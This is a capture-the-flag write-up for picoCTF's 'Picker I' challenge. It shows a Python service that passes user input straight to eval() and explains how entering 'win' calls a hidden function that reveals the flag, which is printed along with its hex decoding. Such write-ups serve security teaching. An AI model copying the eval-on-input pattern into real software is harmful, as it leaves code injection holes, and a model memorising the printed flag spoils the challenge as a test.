# Picker I

## Challenge
General Skills. The service provides a random number, but can it do more? Connect via `nc saturn.picoctf.net 54881`. Source code for `picker-I.py` is provided.

## Hints
1. Can you point the program to a function that does something useful for you?

## Solution
1. Downloaded and read the source code, `picker-I.py`. Found the core input-handling logic:
```python
   while(True):
     try:
       print('Try entering "getRandomNumber" without the double quotes...')
       user_input = input('==> ')
       eval(user_input + '()')
     except Exception as e:
       print(e)
       break
```
   This calls `eval()` on whatever function name is entered, appending `()` to invoke it — meaning any function defined in the script can be called directly.
2. Listed all function definitions in the script to find other callable options besides `getRandomNumber`:
```
   grep "^def" picker-I.py
```
   Output:
```
   def getRandomNumber():
   def exit():
   def esoteric1():
   def win():
   def esoteric2():
```
3. Connected to the service and, instead of the suggested `getRandomNumber`, entered `win` to invoke the `win()` function directly:
```
   nc saturn.picoctf.net 54881
   Try entering "getRandomNumber" without the double quotes...
   ==> win
```
4. The server returned a space-separated hex byte string:
```
   0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d
```
5. Converted the hex string to ASCII:
```
   echo "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d" | sed 's/0x//g;s/ //g' | xxd -r -p
```
6. This directly produced the flag.

## Flag
```
picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}
```